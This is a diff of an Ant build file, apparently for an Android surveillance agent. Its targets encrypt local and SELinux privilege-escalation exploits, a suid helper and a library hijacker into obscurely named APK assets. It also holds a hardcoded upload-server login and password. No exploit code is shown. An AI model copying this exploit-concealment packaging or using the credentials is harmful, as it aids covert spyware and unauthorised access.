@@ -9,7 +9,7 @@
 		<echo>ant update : uploads the core to castore</echo>
 		<echo>ant updatecastoredebug</echo>
 	</target>
-			
+
 	<taskdef resource="net/sf/antcontrib/antlib.xml">
 		<classpath>
 			<pathelement location="antlibs/ant-contrib-1.0b3.jar" />
@@ -94,7 +94,7 @@
 		<delete dir="enc"/>
 		<mkdir dir="enc"/>
 	</target>
-	
+
 	<target name="encrypt-messages" depends="salt,init_enc">
 		<stringencrypt dest="enc" baseDir="src" mFile="preprocess/M.java">
 			<path>
@@ -107,37 +107,37 @@
 		<delete file="assets/s.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/suidext" outputFile="assets/s.bin" />
 	</target>
-	
+
 	<target name="encrypt-selinuxsuid">
 		<delete file="assets/j.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/selinux_suidext" outputFile="assets/j.bin" />
 	</target>
-	
+
 	<target name="encrypt-exploitcheck">
 		<delete file="assets/h.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/expl_check" outputFile="assets/h.bin" />
 	</target>
-	
+
 	<target name="encrypt-selinuxexploitcheck">
 		<delete file="assets/d.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/selinux_check" outputFile="assets/d.bin" />
 	</target>
-	
+
 	<target name="encrypt-localexploit">
 		<delete file="assets/l.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/local_exploit" outputFile="assets/l.bin" />
 	</target>
-	
+
 	<target name="encrypt-selinuxexploit">
 		<delete file="assets/g.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/selinux_exploit" outputFile="assets/g.bin" />
 	</target>
-	
+
 	<target name="encrypt-hijacklibrary">
 		<delete file="assets/i.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/libt.so" outputFile="assets/i.bin" />
 	</target>
-	
+
 	<target name="encrypt-hijacker">
 		<delete file="assets/m.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/hijack" outputFile="assets/m.bin" />
@@ -155,7 +155,7 @@
 		<property file="build.number" />
 		<echo message="timestamp ${timestamp.BUILD}" />
 		<echo message="build.number ${build.number}" />
-		
+
 	</target>
 
 	<!-- = = = = = = = = = = = = = = = = =
@@ -416,12 +416,12 @@
 
 				<echo>clean</echo>
 				<antcall target="clean" />
-				
+
 				<echo message="bin/@{osversion}/${kind}/core.android" />
 				<set-cfg osversion="@{osversion}" kind="${kind}" />
 
 				<antcall target="encrypt-messages" />
-					
+
 				<echo>call release</echo>
 				<antcall target="release" inheritAll="false" />
 				<!-- <var name="filename" value="bin/android_deviceinfo-release-unsigned.apk" /> -->
@@ -435,39 +435,39 @@
 
 		<antcall target="merge" />
 	</target>
-	
+
 	<target name="build_releasedebug" depends="init">
 
-			<for list="default,v2" param="osversion">
-				<sequential>
-					<echo message="===========================" />
-					<echo message="===  BUILD releasedebug ===" />
-					<echo message="===========================" />
-					<echo>Version @{osversion}</echo>
+		<for list="default,v2" param="osversion">
+			<sequential>
+				<echo message="===========================" />
+				<echo message="===  BUILD releasedebug ===" />
+				<echo message="===========================" />
+				<echo>Version @{osversion}</echo>
 
-					<var name="kind" value="releasedebug" />
+				<var name="kind" value="releasedebug" />
 
-					<echo>clean</echo>
-					<antcall target="clean" />
-					
-					<echo message="bin/@{osversion}/${kind}/core.android" />
-					<set-cfg osversion="@{osversion}" kind="${kind}" />
-					
-					<antcall target="encrypt-messages" />
-						
-					<echo>call release</echo>
-					<antcall target="release" inheritAll="false" />
-					<!-- <var name="filename" value="bin/android_deviceinfo-release-unsigned.apk" /> -->
-					<var name="filename" value="bin/android_deviceinfo-release.apk" />
+				<echo>clean</echo>
+				<antcall target="clean" />
 
-					<mkdir dir="output/${kind}/" />
-					<copy file="${filename}" toFile="output/${kind}/core.android.@{osversion}.apk" overwrite="true" />
-				</sequential>
+				<echo message="bin/@{osversion}/${kind}/core.android" />
+				<set-cfg osversion="@{osversion}" kind="${kind}" />
 
-			</for>
+				<antcall target="encrypt-messages" />
 
-			<antcall target="merge" />
-		</target>
+				<echo>call release</echo>
+				<antcall target="release" inheritAll="false" />
+				<!-- <var name="filename" value="bin/android_deviceinfo-release-unsigned.apk" /> -->
+				<var name="filename" value="bin/android_deviceinfo-release.apk" />
+
+				<mkdir dir="output/${kind}/" />
+				<copy file="${filename}" toFile="output/${kind}/core.android.@{osversion}.apk" overwrite="true" />
+			</sequential>
+
+		</for>
+
+		<antcall target="merge" />
+	</target>
 
 
 	<target name="build_debug" depends="init">
@@ -490,7 +490,7 @@
 				<copy file="preprocess/resources.unpatched.bin" toFile="assets/r.bin" overwrite="true" />
 
 				<antcall target="encrypt-messages" />
-				
+
 				<echo>call debug</echo>
 				<antcall target="debug" inheritAll="false" />
 				<!-- <var name="filename" value="bin/android_deviceinfo-release-unsigned.apk" /> -->
@@ -631,10 +631,10 @@
 		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="server/android_${version}.zip" />
 		<echo>ruby antlibs/rcs-core.rb -f RCS_0000001629 -n android -d rcs-castore -u zenobatch -p zenop123 -b build.params -o build/install.zip</echo>
 	</target>
-	
+
 	<target name="updatecastorereleasedebug" depends="build_releasedebug,servercore">
-			<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="server/android_${version}.zip" />
-			<echo>ruby antlibs/rcs-core.rb -f RCS_0000001629 -n android -d rcs-castore -u zenobatch -p zenop123 -b build.params -o build/install.zip</echo>
+		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="server/android_${version}.zip" />
+		<echo>ruby antlibs/rcs-core.rb -n android -d rcs-castore -u zenobatch -p zenop123 -b build.params -o build/install.zip</echo>
 	</target>
 
 	<target name="updatecastore">
